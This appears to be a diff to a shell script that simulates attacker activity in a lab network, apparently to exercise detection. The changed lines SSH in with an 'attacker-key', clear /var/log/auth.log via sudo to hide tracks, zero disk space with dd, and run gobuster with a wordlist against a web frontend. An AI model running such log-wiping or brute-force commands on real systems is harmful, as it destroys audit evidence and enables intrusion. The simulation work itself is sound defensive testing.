@@ -12,7 +12,7 @@ EOT
 
 echo "attempt to clear log file and zero out unallocated disk space"
 ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
-echo "test" | sudo -S cp /dev/null /var/log/alternatives.log
+echo "test" | sudo -S cp /dev/null /var/log/auth.log
 echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
 exit
 EOT
@@ -20,7 +20,7 @@ EOT
 if  [ "${DIRBUSTER}" = true ];
 then
 echo "I invoked gobuster!"
-./gobuster dir -u http://discounts:5001 -w /usr/share/wordlists/rockyou.txt
+./gobuster dir -u http://frontend:3000 -w /usr/share/wordlists/rockyou.txt
 fi
 
 if  [ "${BRUTEFORCE}" = true ];
